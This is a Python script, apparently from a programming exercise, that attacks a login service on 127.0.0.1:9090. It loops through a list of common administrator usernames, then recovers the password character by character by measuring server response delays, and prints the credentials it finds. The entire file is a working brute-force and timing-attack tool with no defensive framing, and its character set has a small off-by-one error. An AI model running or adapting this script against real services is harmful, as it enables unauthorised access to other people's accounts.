import sys
import socket
import json
from datetime import datetime

details = sys.argv
mySocket = socket.socket()
alpha_chars = []
for i in range(10):
    alpha_chars.append(i)
for i in range(27):
    alpha_chars.append(chr(97 + i))
for i in range(27):
    alpha_chars.append(chr(65 + i))
address = ('127.0.0.1', 9090)
mySocket.connect(address)
credentials = {
    "login": "",
    "password": " "
}
# realLogin = 'admin'
logins = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1',
          'user2', 'root', 'default', 'new_user', 'some_user',
          'new_admin', 'administrator', 'Administrator', 'superuser',
          'super', 'su', 'alex', 'suser', 'rootuser', 'adminadmin',
          'useruser', 'superadmin', 'username', 'username1']
start_time = 0
end_time = 0
difference1 = 0
for val in logins:
    credentials['login'] = val
    jsonString = json.dumps(credentials)
    start_time = datetime.now()
    mySocket.send(jsonString.encode('utf-8'))
    received_ = mySocket.recv(1024).decode('utf-8')
    end_time = datetime.now()
    received = json.loads(received_)
    if 'result' in received.keys():
        if received['result'] == "Wrong login!":
            continue
        if received['result'] == "Wrong password!":
            # credentials["login"] = val
            difference1 = end_time - start_time
            break
Password = ""
received = {}
# print(credentials['login'])
# print(difference1)
while True:
    for ch in alpha_chars:
        credentials["password"] = Password + str(ch)
        jsonString = json.dumps(credentials)
        start_time = datetime.now()
        mySocket.send(jsonString.encode('utf-8'))
        received_ = mySocket.recv(1024).decode('utf-8')
        # print(received_ + "  ---  " + str(ch))
        end_time = datetime.now()
        received = json.loads(received_)
        if 'result' in received.keys():
            if received['result'] == "Wrong password!":
                difference2 = end_time - start_time
                # print(difference2)
                if (difference2 - difference1).total_seconds() > 0.1:
                    Password += str(ch)
                    break
            if received['result'] == "Connection success!":
                break
    if 'result' in received.keys():
        if received['result'] == "Connection success!":
            break
print(json.dumps(credentials))
mySocket.close()